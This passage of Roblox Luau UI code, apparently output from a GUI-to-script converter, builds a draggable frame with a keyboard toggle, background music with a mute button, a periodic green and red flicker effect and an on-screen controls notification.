		gui.Position = UDim2.new(startPos.X.Scale, Lerp(gui.Position.X.Offset, xGoal, dt * DRAG_SPEED), startPos.Y.Scale, Lerp(gui.Position.Y.Offset, yGoal, dt * DRAG_SPEED))
	end;
	
	gui.InputBegan:Connect(function(input)
		if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then
			dragging = true
			dragStart = input.Position
			startPos = gui.Position
			lastMousePos = UserInputService:GetMouseLocation()
	
			input.Changed:Connect(function()
				if input.UserInputState == Enum.UserInputState.End then
					dragging = false
				end
			end)
		end
	end)
	
	gui.InputChanged:Connect(function(input)
		if input.UserInputType == Enum.UserInputType.MouseMovement or input.UserInputType == Enum.UserInputType.Touch then
			dragInput = input
		end
	end)
	
	runService.Heartbeat:Connect(Update)
end
coroutine.wrap(XAIRXNO_fake_script)()
local function HKPYV_fake_script() -- ImageButton.LocalScript 
	local script = Instance.new('LocalScript', ImageButton)

	-- LocalScript inside the ImageButton
	
	local button = script.Parent
	local targetFrame = button.Parent -- the frame to open/close
	local visible = true
	
	local function toggle()
		visible = not visible
		targetFrame.Visible = visible
	end
	
	-- Click button to toggle
	button.MouseButton1Click:Connect(toggle)
	
	-- Press X to toggle
	local UserInputService = game:GetService("UserInputService")
	UserInputService.InputBegan:Connect(function(input, gp)
		if gp then return end
		if input.KeyCode == Enum.KeyCode.X then
			toggle()
		end
	end)
	
end
coroutine.wrap(HKPYV_fake_script)()
local function YYELF_fake_script() -- ImageButton_2.LocalScript 
	local script = Instance.new('LocalScript', ImageButton_2)

	local button = script.Parent
	
	-- create the sound inside the button
	local sound = Instance.new("Sound")
	sound.Name = "Music"
	sound.SoundId = "rbxassetid://120905668177229"
	sound.Looped = true
	sound.Volume = 0
	sound.Parent = button
	
	local muted = true
	
	-- wait 5 seconds then start the music
	task.wait(5)
	sound:Play()
	sound.Volume = 0.3
	muted = false
	button.Image = "http://www.roblox.com/asset/?id=133328822613992"
	
	button.MouseButton1Click:Connect(function()
		if not muted then
			-- mute
			sound.Volume = 0
			button.Image = "http://www.roblox.com/asset/?id=17698073882"
			muted = true
		else
			-- unmute
			sound.Volume = 0.3
			button.Image = "http://www.roblox.com/asset/?id=133328822613992"
			muted = false
		end
	end)
	
end
coroutine.wrap(YYELF_fake_script)()
local function MDZZPB_fake_script() -- MAIN.LocalScript 
	local script = Instance.new('LocalScript', MAIN)

	-- LocalScript inside the Frame
	local frame = script.Parent
	local TweenService = game:GetService("TweenService")
	local Debris = game:GetService("Debris")
	
	-- Settings
	local glitchTime = 0.08
	local glitchStrength = 3
	local colours = {Color3.fromRGB(0,255,0), Color3.fromRGB(255,0,0)}
	local minDelay, maxDelay = 25, 40 -- rarer (25–40 seconds between glitches)
	
	-- Sound
	local sound = Instance.new("Sound")
	sound.SoundId = "rbxassetid://120409669161365"
	sound.Volume = 0.2
	sound.Parent = frame
	
	-- one flicker
	local function doOneGlitch()
		if not frame.Visible then return end
	
		local clone = frame:Clone()
		clone.Parent = frame.Parent
		clone.ZIndex = frame.ZIndex + 1
		clone.BackgroundColor3 = colours[math.random(1,#colours)]
	
		clone.Position = frame.Position + UDim2.new(0, math.random(-glitchStrength, glitchStrength), 0, math.random(-glitchStrength, glitchStrength))
	
		TweenService:Create(clone, TweenInfo.new(glitchTime), {BackgroundTransparency = 1}):Play()
		Debris:AddItem(clone, glitchTime + 0.1)
	end
	
	-- glitch sequence (lasts whole sound length)
	local function startGlitch()
		if not frame.Visible then return end
	
		-- play sound
		sound:Play()
	
		local duration = sound.TimeLength
		local startTime = tick()
		while tick() - startTime < duration do
			-- more chaotic during sound
			for i = 1, math.random(1,3) do
				doOneGlitch()
			end
			task.wait(math.random(1,3) * glitchTime)
		end
	end
	
	-- loop
	while true do
		task.wait(math.random(minDelay, maxDelay)) -- wait longer between glitches
		startGlitch()
	end
	
end
coroutine.wrap(MDZZPB_fake_script)()
local function QWHX_fake_script() -- ScreenGui.notification 
	local script = Instance.new('LocalScript', ScreenGui)

	-- LocalScript inside ScreenGui (or anywhere in PlayerGui)
	wait(5)
	
	local StarterGui = game:GetService("StarterGui")
	
	StarterGui:SetCore("SendNotification", {
		Title = "Controls",
		Text = "Press X to OPEN/CLOSE",
		Duration = 5
	})
	
end
coroutine.wrap(QWHX_fake_script)()
